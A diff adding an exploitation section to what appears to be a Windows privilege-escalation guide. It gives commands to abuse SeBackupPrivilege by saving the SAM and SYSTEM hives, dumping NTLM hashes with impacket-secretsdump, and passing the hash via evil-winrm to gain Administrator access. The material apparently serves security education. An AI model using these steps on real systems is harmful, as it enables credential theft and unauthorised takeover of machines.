@@ -392,6 +392,52 @@ Outcome:
 
 #### Exploitation
 
+To abuse this vulnerability you should follow these steps:
+
+1) Create a temp directory:
+
+```
+mkdir C:\temp
+```
+
+2) Cooy the sam and system hive of HKLM to C:\temp and then download them.
+
+```
+reg save hklm\sam C:\temp\sam.hive
+```
+
+and
+
+```
+reg save hklm\system C:\temp\system.hive
+```
+
+Outcome:
+
+![SeBackupPrivilege-Exploitation-Copy-Hives](/Pictures/SeBackUp-Exploitation-1.png)
+
+3) Use [impacket-secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) tool (Kali Linux Default) and obtain ntlm hashes:
+
+```
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```
+
+Outcome:
+
+![SeBackupPrivilege-Exploitation-Observe-NTLM-Hashes](/Pictures/SeBackUp-Exploitation-2.png)
+
+4) Use again evil-winrm to pass the hash and connect as Administrator.
+
+```
+evil-winrm -i 192.168.146.130 -u Administrator -H "31d6cfe0d16ae931b73c59d7e0c089c0"
+```
+
+Outcome:
+
+![SeBackupPrivilege-Exploitation-Evil-WinRM-Pass-The-Hash](/Pictures/SeBackUp-Exploitation-3.png)
+
+#### Mitigation
+
 ### SeImpersonatePrivilege
 
 ### Stored Credentials (Runas)
@@ -412,3 +458,4 @@ Outcome:
 - [Windows Installer Microsoft](https://learn.microsoft.com/en-us/windows/win32/msi/windows-installer-portal)
 - [How to Create the Windows Installer File (*.msi) Microsoft](https://learn.microsoft.com/en-us/mem/configmgr/develop/apps/how-to-create-the-windows-installer-file-msi)
 - [Metasploit Website](https://www.metasploit.com/)
+- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
